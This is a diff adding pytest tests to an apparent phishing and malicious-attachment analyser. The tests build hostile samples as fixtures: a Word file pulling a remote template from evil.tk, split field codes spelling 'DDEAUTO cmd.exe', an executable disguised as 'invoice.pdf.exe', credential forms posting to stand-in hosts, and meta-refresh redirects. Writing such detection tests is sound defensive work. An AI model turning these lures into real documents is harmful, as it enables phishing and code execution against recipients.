@@ -1312,3 +1312,158 @@ def test_hiding_rules_of_every_kind_survive_many_cheap_ones():
             + '<div class="h">filler</div><p>Verify</p>'
         )
         assert ep.html_to_text(html).endswith("filler"), rule
+
+
+_INVISIBLE_CASES = json.loads(
+    (
+        Path(__file__).resolve().parents[2] / "tests" / "fixtures" / "invisible_cases.json"
+    ).read_text()
+)["cases"]
+
+
+@pytest.mark.parametrize("case", _INVISIBLE_CASES, ids=[c["clean"] for c in _INVISIBLE_CASES])
+def test_invisible_cases_shared_with_the_extension(case):
+    from unicode_text import without_invisible
+
+    assert without_invisible(case["text"]) == case["clean"]
+
+
+# ---------------------------------------------------------------------
+# Round 15
+# ---------------------------------------------------------------------
+def _docx(parts: dict[str, str]) -> bytes:
+    import io
+    import zipfile
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as zf:
+        for name, data in parts.items():
+            zf.writestr(name, data)
+    return buf.getvalue()
+
+
+_W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
+
+
+def test_office_parts_are_read_whatever_their_case():
+    import attachment_analysis as aa
+
+    raw = _docx(
+        {
+            "[Content_Types].xml": "",
+            "word/Document.xml": f"<w:document {_W}><w:body><w:p><w:r><w:t>Verify your account</w:t></w:r></w:p></w:body></w:document>",
+            "word/_rels/Document.xml.RELS": '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            '<Relationship Id="r1" Type="http://x/attachedTemplate" Target="https://evil.tk/t.dotm" TargetMode="External"/></Relationships>',
+        }
+    )
+    out = aa.analyse_attachment(base64.b64encode(raw).decode(), filename="invoice.docx")
+    assert "Verify your account" in out["extracted_text"]
+    assert "remote_template" in out["notable_features"]
+
+
+def test_field_codes_split_over_runs_are_joined():
+    import office_analysis as oa
+
+    xml = (
+        f"<w:document {_W}><w:body><w:p>"
+        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
+        "<w:r><w:instrText>DD</w:instrText></w:r><w:r><w:instrText>EAUTO cmd.exe</w:instrText></w:r>"
+        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
+        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
+        '<w:r><w:instrText>HYPERLINK "https://evil.</w:instrText></w:r><w:r><w:instrText>tk/login"</w:instrText></w:r>'
+        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
+        "</w:p></w:body></w:document>"
+    ).encode()
+    codes = oa._field_codes(xml)
+    assert "DDEAUTO cmd.exe" in codes
+    assert 'HYPERLINK "https://evil.tk/login"' in codes
+
+
+@pytest.mark.parametrize(
+    ("parts", "filename"),
+    [
+        (
+            {
+                "[Content_Types].xml": "",
+                "word/x": "",
+                "login.html": "<form><input type=password></form>",
+            },
+            "invoice.docx",
+        ),
+        ({"invoice.pdf.exe": "MZ"}, "invoice.docx"),
+        ({"[Content_Types].xml": "", "word/document.xml": "<x/>", "run.js": "x"}, "report"),
+    ],
+)
+def test_a_zip_is_read_by_what_it_holds_whatever_its_name(parts, filename):
+    import attachment_analysis as aa
+
+    out = aa.analyse_attachment(base64.b64encode(_docx(parts)).decode(), filename=filename)
+    assert out["kind"] == "archive"
+
+
+def test_the_url_model_reads_the_links_as_read():
+    import structured_agents as sa_
+
+    seen = {}
+
+    class Fx:
+        def extract_url_features(self, text):
+            seen["text"] = text
+            return {}
+
+    class Agent:
+        def get_prediction_with_confidence(self, feats):
+            return {"phishing_probability": 0.9}
+
+    old = sa_._FEATURE_EXTRACT, sa_._URL_AGENT
+    sa_._FEATURE_EXTRACT, sa_._URL_AGENT = Fx(), Agent()
+    try:
+        body = "See https://google.com and verify at HTTPS://192.168.1.1/login or www.evil.tk/x"
+        sa_.url_agent(ep.urls_in_text(body), body_text=body)
+    finally:
+        sa_._FEATURE_EXTRACT, sa_._URL_AGENT = old
+    assert "https://192.168.1.1/login" in seen["text"]
+    assert "http://www.evil.tk/x" in seen["text"]
+
+
+def test_a_from_with_two_addresses_survives_the_pages_sender():
+    from extension_backend import AnalyseRequest, _resolve_email
+
+    eml = b'From: "PayPal" <service@paypal.com>, <scam@evil.example>\r\n\r\nHello there friend'
+    req = AnalyseRequest(
+        raw_email_b64=base64.b64encode(eml).decode(),
+        sender_email="service@paypal.com",
+        sender_name="PayPal",
+    )
+    _body, _urls, headers, _raw = _resolve_email(req)
+    assert "scam@evil.example" in headers["from"]
+    assert headers.get(ep.FROM_UNPROVEN) == "1"
+
+
+@pytest.mark.parametrize(
+    ("content", "target"),
+    [
+        ("0; url=https://evil.tk/a", "https://evil.tk/a"),
+        ("0; https://evil.tk/b", "https://evil.tk/b"),
+        ("0,URL = 'https://evil.tk/c'", "https://evil.tk/c"),
+        ("5", ""),
+    ],
+)
+def test_meta_refresh_targets(content, target):
+    from bs4 import BeautifulSoup
+
+    import attachment_analysis as aa
+
+    meta = BeautifulSoup(f'<meta http-equiv="refresh" content="{content}">', "html.parser").meta
+    assert aa._refresh_target(meta) == target
+
+
+def test_a_percent_encoded_base64_page_is_read():
+    import attachment_analysis as aa
+
+    page = base64.b64encode(b"<form action='https://evil.example/login'></form>???").decode()
+    encoded = page.replace("+", "%2B").replace("=", "%3D").replace("/", "%2F")
+    out = aa.analyse_html(
+        f'<iframe src="data:text/html;base64,{encoded}"></iframe>'.encode(), "a.html"
+    )
+    assert "https://evil.example/login" in out["extracted_urls"]
